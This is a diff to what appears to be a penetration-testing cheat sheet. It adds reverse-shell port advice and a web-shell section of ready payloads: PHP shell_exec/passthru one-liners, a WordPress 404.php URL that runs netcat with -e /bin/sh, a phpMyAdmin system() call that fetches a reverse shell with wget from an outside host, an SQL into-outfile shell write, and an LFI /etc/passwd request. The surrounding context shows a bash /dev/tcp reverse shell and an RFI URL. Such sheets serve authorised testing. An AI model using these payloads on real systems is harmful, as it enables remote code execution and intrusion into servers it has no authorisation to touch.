@@ -166,6 +166,9 @@ http://example.com/index.php?page=http://example.evil/shell.txt%00
 ```
 
 ## Reverse Shell payload
+- https://guide.offsecnewbie.com/shells
+- Use port 443 as its generally open on firewalls for HTTPS traffic. Sometimes servers and firewalls block non standard ports like 4444 or 1337
+- If connections drops or can not be established, try different ports 80,443,8080...
 ```bash
 #Bash
 bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
@@ -235,6 +238,25 @@ return 0;
 
 ## Web Shell
 
+```php
+#wordpress
+http://x.x.x.x/404.php?cmd=id
+http://x.x.x.x/404.php?cmd=nc x.x.x.x 4444 -e /bin/sh
+
+<? php echo shell_exec($_GET['cmd']); ?>
+<? passthru($_GET["cmd"]); ?>
+<? php echo shell_exec($_GET["cmd"]); ?>
+
+#phpMyAdmin
+<? php system("/usr/local/bin/wget http://x.x.x.x:4444/php-reverse-shell.php -O /var/tmp/hodor.php 2>&1"); ?>
+
+#SQLQuery
+SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"
+
+#LFI reverse shell
+http://x.x.x.x/blah?parameter=/etc/passwd%00
+
+```
 
 
 # Active Directory Pentesting
